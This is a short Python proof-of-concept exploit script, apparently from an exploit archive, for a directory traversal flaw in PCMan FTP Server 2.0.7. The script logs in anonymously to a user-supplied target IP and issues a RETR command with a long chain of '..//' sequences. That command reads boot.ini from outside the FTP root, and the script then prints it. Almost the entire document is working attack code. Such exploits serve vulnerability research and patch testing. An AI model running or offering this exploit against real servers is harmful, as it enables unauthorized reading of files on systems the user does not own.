#!/usr/bin/python
# title: PCMan FTP Server v2.0.7 Directory Traversal
# author: Jay Turla <@shipcod3>
# tested on Windows XP Service Pack 3 - English
# software Link: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
# description: PCMAN FTP 2.07 is vulnerable to Directory Traversal (quick and dirty code just for PoC)

from ftplib import FTP

ftp = FTP(raw_input("Target IP: "))
ftp.login()
ftp.retrbinary('RETR ..//..//..//..//..//..//..//..//..//..//..//boot.ini', open('boot.ini.txt', 'wb').write)
ftp.close()
file = open('boot.ini.txt', 'r')
print "[**] Printing what's inside boot.ini\n"
print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
print file.read()
print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"